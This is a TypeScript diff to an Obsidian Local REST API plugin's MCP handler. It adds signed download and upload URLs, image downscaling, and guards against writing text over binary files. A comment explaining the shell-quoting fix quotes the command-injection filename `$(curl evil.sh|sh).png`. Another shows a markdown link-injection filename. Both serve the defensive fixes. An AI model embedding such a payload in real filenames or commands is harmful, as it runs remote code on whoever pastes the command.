@@ -12,6 +12,7 @@ import { NodeStreamableHTTPServerTransport, toNodeHandler, toWebRequest } from "
 import type { NodeMcpRequestHandler } from "@modelcontextprotocol/node";
 import { posix } from "path";
 import { randomUUID } from "crypto";
+import { AsyncLocalStorage } from "async_hooks";
 import { z } from "zod";
 import express from "express";
 import mime from "mime-types";
@@ -25,6 +26,19 @@ import openapiYaml from "../docs/openapi.yaml";
 import { toStandardSchema } from "./mcpSchema";
 import { MaximumMcpBinaryBytes } from "./constants";
 import { LocalRestApiSettings } from "./types";
+import {
+  UrlSigner,
+  buildSignedUrl,
+  clampSignedUrlTtl,
+  normalizeVaultFilePath,
+} from "./signedUrls";
+import {
+  CanvasImageScaler,
+  ImageScaler,
+  MaximumImageEdge,
+  ModelReadableImageTypes,
+  isCanvasImageScalingAvailable,
+} from "./imageScaling";
 
 const SERVER_INFO = { name: "obsidian-local-rest-api", version: "1.0.0" };
 
@@ -82,36 +96,83 @@ function parseStringHeadingTarget(target: string): string[] | null | undefined {
 const HEADING_TARGET_STRING_HINT =
   "received a string that is not the JSON encoding of an array — if you did pass an array, your MCP client may not support anyOf-typed tool parameters";
 
-const BASE64_ALPHABET = /^[A-Za-z0-9+/]*={0,2}$/;
+// Mime types whose files are never text, by extension. `vault_write` and `vault_append`
+// refuse a path with one of these, since the text they would write cannot be the file
+// the extension promises, and the usual way this happens — a lossy `vault_read` of an
+// attachment written back — destroys the attachment. The list is deliberately short:
+// a false positive here blocks a legitimate write, a false negative only means the
+// guard did not fire. SVG is the one `image/` type that is text (XML), so it is exempt.
+const SVG_MIME_TYPE = "image/svg+xml";
+const BINARY_MIME_PREFIXES = ["image/", "audio/", "video/", "font/"];
+const BINARY_MIME_TYPES: ReadonlySet<string> = new Set([
+  "application/pdf",
+  "application/octet-stream",
+  "application/wasm",
+]);
 
-// `Buffer.from(s, "base64")` discards anything it cannot decode instead of failing, so a
-// mangled payload would be written to the vault as silently-wrong bytes. Validate the
-// alphabet and padding, then re-encode and compare: a value that does not survive the
-// round trip is not the encoding of the bytes we would have written.
-function decodeBase64Strict(value: string): Buffer {
-  const compact = value.replace(/\s+/g, "");
-  // RFC 4648 defines two alphabets, and the URL-safe one is common enough that a caller
-  // can arrive with it by accident. Name it only when the payload actually looks like it,
-  // so the usual failure is not buried under a paragraph about an encoding nobody used.
-  const looksLikeBase64Url = /[-_]/.test(compact);
-  const rejected = (why: string): Error =>
-    new Error(
-      `content must be base64-encoded bytes (${why})` +
-        (looksLikeBase64Url
-          ? ". This looks like base64url; use '+' and '/' rather than '-' and '_'."
-          : "."),
+// Archives are matched by shape as well as by name. An explicit list was already wrong --
+// `.bz2` and `.xz` resolve to `application/x-bzip2` and `application/x-xz`, neither of
+// which was in it -- and mime-db knows dozens more, every `epub+zip`, `usdz+zip` and
+// vendor container among them. Two patterns cover the families, and the set holds the
+// plain names that match neither.
+const ARCHIVE_MIME_TYPES: ReadonlySet<string> = new Set([
+  "application/zip",
+  "application/gzip",
+  "application/tar",
+  "application/zstd",
+  "application/x-tar",
+  "application/x-gtar",
+  "application/x-ustar",
+  "application/x-gzip",
+  "application/x-compress",
+  "application/x-bzip",
+  "application/x-bzip2",
+  "application/x-xz",
+  "application/x-arj",
+  "application/x-stuffit",
+  "application/x-stuffitx",
+  "application/x-iso9660-image",
+  "application/vnd.rar",
+  "application/vnd.comicbook-rar",
+  "application/vnd.laszip",
+  "application/vnd.dece.zip",
+]);
+
+function isArchiveMimeType(type: string): boolean {
+  return (
+    /\+(?:zip|gzip)$/.test(type) || // epub+zip, usdz+zip, every vendor container
+    /-compressed$/.test(type) || // x-7z-compressed, x-lzh-compressed, ms-cab-compressed
+    ARCHIVE_MIME_TYPES.has(type)
+  );
+}
+
+function binaryMimeTypeFor(path: string): string | null {
+  const type = mime.lookup(path);
+  if (!type) return null;
+  // SVG is exempt because it is XML, but only *uncompressed* SVG. `mime-types` maps the
+  // `.svgz` extension to image/svg+xml as well, and that is a gzip stream -- exempting by
+  // MIME type alone let `vault_write` overwrite an .svgz attachment with UTF-8 text,
+  // which is exactly the corruption this guard exists to stop. Match the extension.
+  if (type === SVG_MIME_TYPE && /\.svg$/i.test(path)) return null;
+  if (BINARY_MIME_PREFIXES.some((prefix) => type.startsWith(prefix))) return type;
+  if (isArchiveMimeType(type)) return type;
+  return BINARY_MIME_TYPES.has(type) ? type : null;
+}
+
+// The text tools refuse to write what cannot be text: a path whose extension names a
+// binary type, or content carrying a NUL byte, which no text file has.
+function assertTextWrite(path: string, content: string): void {
+  const binaryType = binaryMimeTypeFor(path);
+  if (binaryType !== null) {
+    throw new Error(
+      `Refusing to write ${path} as text: its extension says it is ${binaryType}, and writing text there would corrupt it. Upload the bytes instead: vault_get_upload_url gives a URL to PUT the file to (when signed URLs are enabled), or PUT /vault/<path> over the REST API with the API key.`,
     );
-  if (compact.length % 4 !== 0) {
-    throw rejected("length is not a multiple of 4");
   }
-  if (!BASE64_ALPHABET.test(compact)) {
-    throw rejected("contains characters outside the base64 alphabet");
+  if (content.includes("\0")) {
+    throw new Error(
+      `Refusing to write ${path}: the content contains a NUL byte, so it is not text. Upload the bytes with vault_get_upload_url or PUT /vault/<path> over the REST API.`,
+    );
   }
-  const decoded = Buffer.from(compact, "base64");
-  if (decoded.toString("base64") !== compact) {
-    throw rejected("it does not survive a decode/re-encode round trip");
-  }
-  return decoded;
 }
 
 // A file that is not text still "reads" through Obsidian's own reader: it decodes as
@@ -139,13 +200,63 @@ function decodeUtf8Strict(bytes: ArrayBuffer, path: string): string {
   }
 }
 
-// Both binary tools refuse the same way, so the ceiling reads identically whichever
-// direction a client hit it from.
-function assertWithinBinaryCeiling(byteLength: number, verb: string): void {
-  if (byteLength <= MaximumMcpBinaryBytes) return;
-  throw new Error(
-    `Refusing to ${verb} ${byteLength} bytes over MCP: the limit is ${MaximumMcpBinaryBytes} bytes, because base64 costs roughly 0.35-0.45 tokens per byte of context. Use the REST API instead — GET or PUT /vault/<path> carries raw bytes.`,
-  );
+// How `vault_read_binary` should hand a file back. `auto` picks by type: a raster image
+// becomes an `image` block, an SVG is passed through unchanged as its source text, and
+// anything else becomes a signed link (when enabled) or embedded bytes (when small
+// enough).
+type BinaryReadMode = "auto" | "bytes" | "link";
+
+const SIGNED_URLS_DISABLED_HINT =
+  'Signed URLs are disabled. Turn on "Enable signed URLs" under Settings → Local REST API → Advanced settings to use them.';
+
+/** The URI an embedded vault resource is labelled with. Not fetchable; a name for the bytes. */
+function vaultResourceUri(normalizedPath: string): string {
+  return `obsidian://local-rest-api/vault/${normalizedPath.split("/").map(encodeURIComponent).join("/")}`;
+}
+
+/**
+ * A markdown link whose label is a vault filename and whose destination is a signed URL.
+ *
+ * The label is untrusted input. A file named `report](https://example.invalid/).pdf`
+ * closes the label early, and the text then renders as a link to wherever the *filename*
+ * says while the structured `resource_link` beside it still points at the vault -- so a
+ * crafted attachment could choose where a reader is sent. That matters more here than it
+ * looks: the tool descriptions ask an agent to repeat this link in its own reply, which
+ * is precisely where it would be rendered and clicked.
+ *
+ * The characters that shape a link (`\`, `[`, `]`, `<`, `>`) and the inline-formatting
+ * ones (`` ` ``, `*`, `_`) are backslash-escaped, which CommonMark permits for any ASCII
+ * punctuation. Newlines are folded to spaces, since a label cannot span lines. The
+ * destination is already percent-encoded segment by segment, but `encodeURIComponent`
+ * leaves `(` and `)` alone and an unbalanced `)` ends the destination early, so those two
+ * are encoded here; the REST side decodes them back.
+ */
+export function markdownLink(label: string, url: string): string {
+  const escapedLabel = label
+    .replace(/[\\[\]<>`*_]/g, (c) => `\\${c}`)
+    .replace(/[\r\n]+/g, " ");
+  const safeUrl = url.replace(/\(/g, "%28").replace(/\)/g, "%29");
+  return `[${escapedLabel}](${safeUrl})`;
+}
+
+function filenameOf(path: string): string {
+  return path.includes("/") ? path.slice(path.lastIndexOf("/") + 1) : path;
+}
+
+/**
+ * Quote a string so a POSIX shell reads it as one literal word.
+ *
+ * This exists because `JSON.stringify` looked close enough and is not: it produces a
+ * *double*-quoted string, and a shell still expands `$`, backticks and `$(...)` inside
+ * double quotes. A vault file named `$(curl evil.sh|sh).png` therefore turned the
+ * ready-to-run command this handler advertises into arbitrary code execution the moment
+ * someone pasted it. Single quotes suppress every expansion; the only character that
+ * cannot appear inside them is `'` itself, which is closed, escaped, and reopened.
+ */
+export function shellQuote(value: string): string {
+  // Written as plain strings, not a template literal: inside a template literal `\'`
+  // collapses to a bare `'` and the backslash this depends on is silently lost.
+  return "'" + value.split("'").join("'\\''") + "'";
 }
 
 interface ResourceSpec {
@@ -192,10 +303,31 @@ export class McpHandler {
   // sessionless leg neither issues nor reads `Mcp-Session-Id`.
   private readonly sessions: Map<string, Session> = new Map();
 
+  // The HTTP request a tool call arrived on. The SDK hands tool callbacks no view of
+  // the transport, and the signed-URL tools need the request's scheme and Host to build
+  // a URL the caller can actually reach, so `handleRequest` runs the SDK inside this
+  // store and the callbacks read it back. Async context follows the request through the
+  // SDK's own awaits, which is what makes it per-request rather than a shared field.
+  private readonly requestContext = new AsyncLocalStorage<express.Request>();
+
+  private readonly signer: UrlSigner;
+  private readonly imageScaler: ImageScaler | null;
+  // Handles for the tools that only exist while signed URLs are enabled, so the setting
+  // can be toggled without rebuilding the handler.
+  private signedUrlToolHandles: Array<{ remove: () => void }> = [];
+
   constructor(
     private readonly ops: VaultOperations,
     private readonly settings: LocalRestApiSettings,
+    options: { signer?: UrlSigner; imageScaler?: ImageScaler | null } = {},
   ) {
+    this.signer = options.signer ?? new UrlSigner();
+    this.imageScaler =
+      options.imageScaler !== undefined
+        ? options.imageScaler
+        : isCanvasImageScalingAvailable()
+          ? new CanvasImageScaler()
+          : null;
     const onerror = (error: Error) => this.logHandlerError(error);
     this.sessionlessHandler = createMcpHandler(() => this.buildServer().server, {
       legacy: "reject",
@@ -204,6 +336,259 @@ export class McpHandler {
     this.sessionlessNodeHandler = toNodeHandler(this.sessionlessHandler, { onerror });
     this.registerResources();
     this.registerTools();
+    if (this.settings.enableSignedUrls) {
+      this.registerSignedUrlTools();
+    }
+  }
+
+  /**
+   * Register or remove the tools that mint signed URLs, to match the setting. Called
+   * by the settings tab when the toggle changes; connected clients learn of the change
+   * through the usual list-changed notifications.
+   */
+  public setSignedUrlsEnabled(enabled: boolean): void {
+    const registered = this.signedUrlToolHandles.length > 0;
+    if (enabled && !registered) {
+      this.registerSignedUrlTools();
+    } else if (!enabled && registered) {
+      for (const handle of this.signedUrlToolHandles) handle.remove();
+      this.signedUrlToolHandles = [];
+    }
+  }
+
+  private get signedUrlsEnabled(): boolean {
+    return this.settings.enableSignedUrls === true;
+  }
+
+  private get signedUrlTtlSeconds(): number {
+    return clampSignedUrlTtl(this.settings.signedUrlTtlSeconds);
+  }
+
+  // Scheme and host as the caller reached us, so the link we hand back resolves from
+  // wherever the caller is. The scheme is the listener's, unless a proxy in front says
+  // otherwise; the host is the Host header as sent. A forged Host misleads only the
+  // caller who forged it, so neither is validated further.
+  private baseUrlFromRequest(): string {
+    const req = this.requestContext.getStore();
+    if (!req) {
+      throw new Error(
+        "Cannot build a URL for this server: the tool call did not arrive over HTTP.",
+      );
+    }
+    const forwarded = req.get("x-forwarded-proto")?.split(",")[0]?.trim().toLowerCase();
+    const socket = req.socket as { encrypted?: boolean } | undefined;
+    const scheme =
+      forwarded === "http" || forwarded === "https"
+        ? forwarded
+        : socket?.encrypted
+          ? "https"
+          : "http";
+    const host = req.get("host");
+    if (!host) {
+      throw new Error("Cannot build a URL for this server: the request carried no Host header.");
+    }
+    return `${scheme}://${host}`;
+  }
+
+  private signedUrlFor(
+    method: "GET" | "PUT",
+    normalizedPath: string,
+    extraQuery: Record<string, string> = {},
+  ): { url: string; expiresAt: string } {
+    const params = this.signer.sign(method, normalizedPath, this.signedUrlTtlSeconds);
+    return {
+      url: buildSignedUrl(this.baseUrlFromRequest(), normalizedPath, params, extraQuery),
+      expiresAt: new Date(params.exp * 1000).toISOString(),
+    };
+  }
+
+  private normalizedFilePath(path: string): string {
+    const normalized = normalizeVaultFilePath(path);
+    if (normalized === null) {
+      throw new Error(`Not a file path inside the vault: ${path}`);
+    }
+    return normalized;
+  }
+
+  private existingFile(path: string): TFile {
+    const file = this.ops.app.vault.getAbstractFileByPath(path);
+    if (!(file instanceof TFile)) throw new Error(`File not found: ${path}`);
+    return file;
+  }
+
+  // A `resource_link` to a signed download URL, plus a markdown link in a text block for
+  // clients that render only text. Addressed to the user: the model gains nothing from a
+  // URL it cannot follow, and the link is for a person to click or a shell to fetch.
+  private downloadLinkResult(path: string): CallToolResult {
+    const normalized = this.normalizedFilePath(path);
+    const file = this.existingFile(normalized);
+    const mimeType = mime.lookup(normalized) || "application/octet-stream";
+    const { url, expiresAt } = this.signedUrlFor("GET", normalized);
+    const name = filenameOf(normalized);
+    return {
+      content: [
+        {
+          type: "resource_link",
+          uri: url,
+          name,
+          mimeType,
+          size: file.stat.size,
+          description: `${normalized} (${mimeType}, ${file.stat.size} bytes); link expires ${expiresAt}`,
+          // Both audiences, deliberately. The link is the whole point of the call, so the
+          // model needs it to say what happened and to hand it on; the user needs it to
+          // click. Marking it user-only would, in a client that honours `audience`, leave
+          // the model unable to report the result of a tool it just ran. The spec's own
+          // resource_link example annotates for the assistant for the same reason.
+          //
+          // `priority` ranks this above the text block below: 1 is "effectively required",
+          // 0 "entirely optional", so a client with room for one of the two should keep
+          // the structured link rather than its prose restatement.
+          // `lastModified` is what `stat` already knows, in the field the spec has for it.
+          annotations: {
+            audience: ["user", "assistant"],
+            priority: 0.9,
+            lastModified: new Date(file.stat.mtime).toISOString(),
+          },
+        },
+        {
+          type: "text",
+          // Deliberately thin: `mimeType` and `size` live on the resource_link block
+          // immediately above, so repeating them here paid twice for one fact. What is
+          // left is the markdown form of the link -- the thing an agent pastes into a
+          // reply -- and the expiry, which is what decides whether it still works.
+          text: `${markdownLink(name, url)} — link valid until ${expiresAt}.`,
+          // The fallback for clients that do not render resource_link at all. It restates
+          // the block above, so it is ranked low: a client that renders both shows the
+          // same link twice, and this is the copy worth dropping.
+          annotations: { audience: ["user", "assistant"], priority: 0.3 },
+        },
+      ],
+    };
+  }
+
+  /** The one refusal for a file too big to inline, raised from the stat or the bytes. */
+  private throwOversizedForEmbedding(size: number): never {
+    throw new Error(
+      `Refusing to embed ${size} bytes in the result: the limit is ${MaximumMcpBinaryBytes} bytes, because base64 costs roughly 0.35-0.45 tokens per byte of context. ` +
+        (this.signedUrlsEnabled
+          ? 'Call again with as: "link" for a signed download URL instead.'
+          : `Fetch it over the REST API with GET /vault/<path>, or enable signed URLs to get a download link here. ${SIGNED_URLS_DISABLED_HINT}`),
+    );
+  }
+
+  private embeddedBytesResult(
+    normalizedPath: string,
+    bytes: ArrayBuffer,
+    mimeType: string,
+  ): CallToolResult {
+    if (bytes.byteLength > MaximumMcpBinaryBytes) {
+      this.throwOversizedForEmbedding(bytes.byteLength);
+    }
+    return {
+      content: [
+        {
+          type: "resource",
+          resource: {
+            uri: vaultResourceUri(normalizedPath),
+            mimeType,
+            blob: Buffer.from(bytes).toString("base64"),
+          },
+        },
+      ],
+    };
+  }
+
+  // An SVG is a vector drawing and also plain XML, so it goes through unchanged as text
+  // rather than through the canvas: nothing is rasterized, nothing is resized, and the
+  // model reads the markup it would have to reason about anyway. (It cannot be handed
+  // over as an `image` block — the image input types are the raster ones in
+  // `ModelReadableImageTypes` — and Chromium's `createImageBitmap` refuses an SVG with
+  // no intrinsic size, so rasterizing was never a dependable path either.) Returns null
+  // when the bytes are not UTF-8 or the file is over the embedding ceiling; the caller
+  // then falls back to the link/bytes path like any other non-image file.
+  private svgTextResult(normalizedPath: string, bytes: ArrayBuffer): CallToolResult | null {
+    if (bytes.byteLength > MaximumMcpBinaryBytes) return null;
+    let text: string;
+    try {
+      text = new TextDecoder("utf-8", { fatal: true, ignoreBOM: true }).decode(bytes);
+    } catch {
+      return null;
+    }
+    return {
+      content: [
+        {
+          type: "resource",
+          resource: {
+            uri: vaultResourceUri(normalizedPath),
+            mimeType: SVG_MIME_TYPE,
+            text,
+          },
+        },
+        {
+          type: "text",
+          text: JSON.stringify({ path: normalizedPath, mimeType: SVG_MIME_TYPE, size: bytes.byteLength }),
+        },
+      ],
+    };
+  }
+
+  private async imageResult(
+    normalizedPath: string,
+    bytes: ArrayBuffer,
+    mimeType: string,
+  ): Promise<CallToolResult | null> {
+    let data: Buffer;
+    let outputType = mimeType;
+    let dimensions: { width: number; height: number } | undefined;
+    if (this.imageScaler) {
+      try {
+        const scaled = await this.imageScaler.scale(bytes, mimeType, MaximumImageEdge);
+        data = scaled.data;
+        outputType = scaled.mimeType;
+        dimensions = { width: scaled.width, height: scaled.height };
+      } catch {
+        // Not something the renderer could decode (a corrupt file, a type the
+        // extension lied about): it is not an image the model can look at either.
+        return null;
+      }
+    } else if (ModelReadableImageTypes.has(mimeType) && bytes.byteLength <= MaximumMcpBinaryBytes) {
+      // No scaler in this runtime: the original bytes go through as-is when the model
+      // can read the type and the file is small enough to be worth it.
+      data = Buffer.from(bytes);
+    } else {
+      return null;
+    }
+    // The size guard, applied to what actually goes on the wire rather than to the file
+    // on disk. `fitWithin` only resizes an image whose long edge exceeds
+    // `MaximumImageEdge`, so a large-but-not-wide image -- a detailed 1536x864 screenshot,
+    // say -- comes back from the scaler as its original bytes, untouched. Without this
+    // check that payload goes out at full size and takes the renderer down with it. See
+    // `MaximumMcpBinaryBytes` for what happens above the limit.
+    //
+    // Returning null rather than throwing lets the caller fall back to a signed download
+    // link, which costs the model nothing and still gets the bytes to whoever wants them.
+    if (data.byteLength > MaximumMcpBinaryBytes) {
+      return null;
+    }
+    return {
+      content: [
+        {
+          type: "image",
+          data: data.toString("base64"),
+          mimeType: outputType,
+          annotations: { audience: ["user", "assistant"], priority: 0.9 },
+        },
+        {
+          type: "text",
+          text: JSON.stringify({
+            path: normalizedPath,
+            mimeType,
+            size: bytes.byteLength,
+            ...dimensions,
+          }),
+        },
+      ],
+    };
   }
 
   // Build a fresh McpServer from the current specs. The sessionless leg discards the tool
@@ -331,11 +716,13 @@ export class McpHandler {
     req: express.Request,
     res: express.Response,
   ): Promise<void> {
-    if (await this.isSessionlessRequest(req)) {
-      await this.sessionlessNodeHandler(req, res, req.body);
-      return;
-    }
-    await this.handleSessionfulRequest(req, res);
+    await this.requestContext.run(req, async () => {
+      if (await this.isSessionlessRequest(req)) {
+        await this.sessionlessNodeHandler(req, res, req.body);
+        return;
+      }
+      await this.handleSessionfulRequest(req, res);
+    });
   }
 
   /**
@@ -444,6 +831,51 @@ export class McpHandler {
     );
   }
 
+  // The tools that hand out signed URLs. Registered only while the setting is on, so a
+  // client of a server where they are off never sees them.
+  private registerSignedUrlTools(): void {
+    this.signedUrlToolHandles = [
+      this.tool(
+        "vault_get_download_url",
+        dedent`
+          Return a signed, expiring URL for GET /vault/<path> as a resource_link, plus a markdown link. The URL needs no API key, so it can be opened in a browser or fetched with curl, and the bytes never pass through this conversation. Many clients do not surface a resource_link to the person at all, so when the file is for them rather than for you: if you can fetch a URL and put a local file in front of them, download it to scratch space and show them that file. The bytes then go from the vault to their screen without passing through your context, which is the cheapest route and the one this link exists to enable -- so do not read the downloaded file back in yourself, which would pay exactly the token cost the link avoids. Failing that, repeat the markdown link in your own reply, where it renders as something clickable, noting that this gets them a link rather than a picture: a markdown image does not display inline in a terminal client. Over HTTPS the browser must trust the plugin's certificate; the plain-HTTP port avoids that. Throws if the file does not exist.
+        `,
+        { path: z.string().describe("File path relative to vault root") },
+        READ_ONLY_ANNOTATIONS,
+        async ({ path }: { path: string }) => this.downloadLinkResult(path),
+      ),
+      this.tool(
+        "vault_get_upload_url",
+        dedent`
+          Return a signed, single-use URL for PUT /vault/<path>, for uploading a file that exists on your host. The result includes a ready-to-run curl command. The Content-Type is informational: a signed upload stores exactly the bytes you send, whatever type you declare, so a pretty-printed .json keeps its whitespace instead of being reparsed and re-serialized. The URL needs no API key and expires; the request that succeeds consumes it. Creates missing parent directories and overwrites an existing file without warning.
+        `,
+        { path: z.string().describe("Destination file path relative to vault root") },
+        { readOnlyHint: false, destructiveHint: true, idempotentHint: false, openWorldHint: false },
+        async ({ path }: { path: string }) => {
+          const normalized = this.normalizedFilePath(path);
+          const mimeType = mime.lookup(normalized) || "application/octet-stream";
+          const { url, expiresAt } = this.signedUrlFor("PUT", normalized);
+          // Only what varies per call, plus the ready-to-run command. `method` and
+          // `singleUse` used to be here and were dropped: both are constants this tool's
+          // own description already states, so sending them cost a client tokens on every
+          // call to be told again what it was told at registration. `path` stays because
+          // it is the *normalized* target rather than an echo of the argument -- this tool
+          // overwrites without warning, so what it resolved to is worth confirming.
+          return this.text({
+            url,
+            path: normalized,
+            contentType: mimeType,
+            expiresAt,
+            // Every interpolated part is shell-quoted, the URL included: `baseUrlFromRequest`
+            // takes the host from the request, so a Host header carrying a quote or `$(...)`
+            // would otherwise break out of the double quotes this used to use.
+            command: `curl -X PUT -H ${shellQuote(`Content-Type: ${mimeType}`)} --data-binary @${shellQuote(filenameOf(normalized))} ${shellQuote(url)}`,
+          });
+        },
+      ),
+    ];
+  }
+
   private registerTools(): void {
     this.tool(
       "vault_list",
@@ -538,13 +970,14 @@ export class McpHandler {
 
     this.tool(
       "vault_write",
-      dedent`Create or overwrite a vault file with the given content. Creates any missing parent directories automatically. Overwrites without warning if the file already exists.`,
+      dedent`Create or overwrite a vault file with the given content. Text only: a path whose extension names an image, audio, video, font, PDF or archive type is refused, as is content containing a NUL byte, because writing text there would corrupt the file -- upload those bytes with vault_get_upload_url, or PUT /vault/<path> over the REST API. Creates any missing parent directories automatically. Overwrites without warning if the file already exists.`,
       {
         path: z.string().describe("File path relative to vault root"),
         content: z.string().describe("Full file content (markdown text)"),
       },
       { readOnlyHint: false, destructiveHint: true, idempotentHint: true, openWorldHint: false },
       async ({ path, content }: { path: string; content: string }) => {
+        assertTextWrite(path, content);
         await this.ops.writeFileContent(path, content);
         return this.text({ message: "OK" });
       },
@@ -553,58 +986,81 @@ export class McpHandler {
     this.tool(
       "vault_read_binary",
       dedent`
-        Read a vault file as raw bytes, returned base64-encoded. Use this for anything that is not text — images, PDFs, audio, any attachment. vault_read decodes a file as UTF-8 and will hand back a lossy, unusable string for those, so writing the result of a vault_read back to a binary file destroys it.
+        Read a non-text vault file: an image, PDF, audio, any attachment. A raster image comes back as an image block (downscaled to fit ${MaximumImageEdge}px) plus a text block with its path, mimeType, size, width, and height. An image still larger than ${MaximumMcpBinaryBytes} bytes once downscaled comes back as a resource_link instead, the same as any other oversized file -- or, when signed URLs are off and there is no link to give, is refused with a pointer at the REST endpoint. Since many clients do not show a resource_link to the person, do not leave them with nothing: if you can fetch a URL and put a local file in front of them, download the link to scratch space and show them that file -- the picture reaches them without its bytes passing through your context, and do not read the download back in yourself. Failing that, say why they are getting a link and repeat it in your reply. An SVG comes back unchanged, as its source text in a resource block. Anything else comes back as a resource_link to a signed download URL when signed URLs are enabled, or embedded base64 when they are not and the file is under ${MaximumMcpBinaryBytes} bytes.
 
-        Returns a JSON object with: path, mimeType (guessed from the file extension), size (the file's size in bytes, before encoding), encoding (always "base64"), and content (the base64 payload). Throws if the file does not exist.
-
-        Base64 costs roughly 0.35-0.45 tokens per byte of file, so this is only practical for small files: a 1 MB attachment is several hundred thousand tokens of context. Files over ${MaximumMcpBinaryBytes} bytes are refused outright — fetch those with the REST API's GET /vault/<path>, which carries raw bytes at no context cost.
-      `,
-      { path: z.string().describe("File path relative to vault root") },
-      READ_ONLY_ANNOTATIONS,
-      async ({ path }: { path: string }) => {
-        const bytes = await this.ops.readBinaryFileContent(path);
-        assertWithinBinaryCeiling(bytes.byteLength, "read");
-        return this.text({
-          path,
-          mimeType: mime.lookup(path) || "application/octet-stream",
-          size: bytes.byteLength,
-          encoding: "base64",
-          content: Buffer.from(bytes).toString("base64"),
-        });
-      },
-    );
-
-    this.tool(
-      "vault_write_binary",
-      dedent`
-        Create or overwrite a vault file with raw bytes supplied base64-encoded. Use this for anything that is not text — images, PDFs, audio, any attachment. Creates any missing parent directories automatically, and overwrites without warning if the file already exists.
-
-        content is base64. A payload that cannot be decoded cleanly is rejected rather than written, since a silently corrupted attachment is worse than a failed call.
-
-        Files over ${MaximumMcpBinaryBytes} bytes are refused — upload those with the REST API's PUT /vault/<path>, which accepts raw bytes of any content type.
+        as overrides that: 'bytes' embeds the raw bytes (under ${MaximumMcpBinaryBytes} bytes only); 'link' returns a signed download URL instead of any bytes. Throws if the file does not exist.
       `,
       {
         path: z.string().describe("File path relative to vault root"),
-        content: z.string().describe("Full file content, base64-encoded"),
+        as: z
+          .enum(["auto", "bytes", "link"])
+          .optional()
+          .describe("How to return the file: 'auto' (default), 'bytes', or 'link'"),
       },
-      { readOnlyHint: false, destructiveHint: true, idempotentHint: true, openWorldHint: false },
-      async ({ path, content }: { path: string; content: string }) => {
-        const bytes = decodeBase64Strict(content);
-        assertWithinBinaryCeiling(bytes.byteLength, "write");
-        await this.ops.writeFileContent(path, bytes);
-        return this.text({ message: "OK", size: bytes.byteLength });
+      READ_ONLY_ANNOTATIONS,
+      async ({ path, as }: { path: string; as?: BinaryReadMode }) => {
+        const mode: BinaryReadMode = as ?? "auto";
+        const normalized = this.normalizedFilePath(path);
+        if (mode === "link") {
+          if (!this.signedUrlsEnabled) {
+            throw new Error(`Cannot return a link: ${SIGNED_URLS_DISABLED_HINT}`);
+          }
+          return this.downloadLinkResult(normalized);
+        }
+        const mimeType = mime.lookup(normalized) || "application/octet-stream";
+        const isSvg = mimeType === SVG_MIME_TYPE;
+        const isRaster = !isSvg && mimeType.startsWith("image/");
+        // Decide from the stat wherever the stat can decide, because reading first meant
+        // pulling a multi-gigabyte file into the renderer only to discard it -- the sort
+        // of allocation that kills the renderer outright (see MaximumMcpBinaryBytes).
+        //
+        // The one thing that can come back *smaller* than it is on disk is a raster image
+        // this runtime has a scaler for, in `auto` mode. An SVG is returned as its own
+        // source, a raster image with no scaler is passed through untouched, and `bytes`
+        // mode skips the scaler entirely -- so in every other case the file's size already
+        // determines the outcome and the read buys nothing.
+        const canReduce = mode === "auto" && isRaster && this.imageScaler !== null;
+        if (!canReduce) {
+          const size = this.existingFile(normalized).stat.size;
+          if (size > MaximumMcpBinaryBytes) {
+            if (mode === "auto" && this.signedUrlsEnabled) {
+              return this.downloadLinkResult(normalized);
+            }
+            this.throwOversizedForEmbedding(size);
+          }
+        }
+        // Nothing but an SVG or a raster image needs the bytes in hand at all; with signed
+        // URLs on, everything else is a link.
+        if (mode === "auto" && this.signedUrlsEnabled && !isSvg && !isRaster) {
+          return this.downloadLinkResult(normalized);
+        }
+        // The post-read checks in `svgTextResult`, `imageResult` and `embeddedBytesResult`
+        // stay: they bound what the scaler actually produced, which no stat can predict.
+        const bytes = await this.ops.readBinaryFileContent(normalized);
+        if (mode === "auto" && mimeType === SVG_MIME_TYPE) {
+          const svg = this.svgTextResult(normalized, bytes);
+          if (svg) return svg;
+        } else if (mode === "auto" && mimeType.startsWith("image/")) {
+          const image = await this.imageResult(normalized, bytes, mimeType);
+          if (image) return image;
+        }
+        if (mode === "auto" && this.signedUrlsEnabled) {
+          return this.downloadLinkResult(normalized);
+        }
+        return this.embeddedBytesResult(normalized, bytes, mimeType);
       },
     );
 
     this.tool(
       "vault_append",
-      dedent`Append content to the end of a vault file. Creates the file if it does not already exist.`,
+      dedent`Append content to the end of a vault file. Creates the file if it does not already exist. Text only, on the same terms as vault_write: a path whose extension names a binary type is refused, as is content containing a NUL byte.`,
       {
         path: z.string().describe("File path relative to vault root"),
         content: z.string().describe("Content to append"),
       },
       { readOnlyHint: false, destructiveHint: false, idempotentHint: false, openWorldHint: false },
       async ({ path, content }: { path: string; content: string }) => {
+        assertTextWrite(path, content);
         await this.ops.appendFileContent(path, content);
         return this.text({ message: "OK" });
       },
